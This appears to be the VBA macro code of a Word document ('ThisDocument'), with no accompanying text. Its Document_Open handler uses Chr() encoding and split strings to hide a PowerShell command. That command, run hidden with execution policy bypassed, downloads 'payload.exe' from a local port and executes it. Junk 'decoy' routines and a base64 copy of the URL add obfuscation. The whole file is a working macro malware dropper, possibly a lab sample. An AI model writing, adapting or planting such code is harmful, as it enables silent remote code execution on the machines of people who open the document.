
Public Sub OblivionXJunkRoutine()
    Dim junkcounter As Long
    Dim junktext As String
    If False Then
        junktext = "decoy"
        junkcounter = 1 + 1
    End If
    Dim deadvarunused As Long
    If 1 = 2 Then
        deadvarunused = 999
    End If

End Sub
Attribute VB_Name = "ThisDocument"
Private Sub Document_Open()
    If MsgBox(Chr(68) & Chr(111) & Chr(32) & Chr(121) & Chr(111) & Chr(117) & Chr(32) & Chr(119) & Chr(97) & Chr(110) & Chr(116) & Chr(32) & Chr(116) & Chr(111) & Chr(32) & Chr(101) & Chr(110) & Chr(97) & Chr(98) & Chr(108) & Chr(101) & Chr(32) & Chr(116) & Chr(104) & Chr(105) & Chr(115) & Chr(32) & Chr(99) & Chr(111) & Chr(110) & Chr(116) & Chr(101) & Chr(110) & Chr(116) & Chr(63), vbYesNo) <> vbYes Then
        Exit Sub
    End If
    Dim lckhv437 As String
    Dim xcx6ug6uo As Object
    Dim sarv21hmdtd5d As String, outPath As String
    sarv21hmdtd5d = "http" & "://1" & "27.0" & ".0.1" & ":9090/" & "paylo" & "ad.exe"
    outPath = Environ("TEMP") & "\oblivion" & "x_payload" & ".exe"
    lckhv437 = "powers" & "hell.exe " & "-NoPro" & "file -Win" & "dowSt" & "yle H" & "idden " & _
          "-Execut" & "ionP" & "olicy By" & "pass" & " -Com" & "mand" & " " & Chr(34) & _
          "(New-Object System.Net.WebClient).DownloadFile('" & sarv21hmdtd5d & "','" & outPath & "'); " & _
          "Invoke-Item '" & outPath & "'" & Chr(34)
    Set xcx6ug6uo = CreateObject("WScript.S" & "hell")
    xcx6ug6uo.Run lckhv437, 0, False
End Sub

Public Function OblivionXDecoy() As String
    Dim b64 As String
    b64 = "aHR0cDovLzEyNy4wLjAuMTo5MDkwL3BheWxvYWQuZXhl"
    OblivionXDecoy = b64
End Function
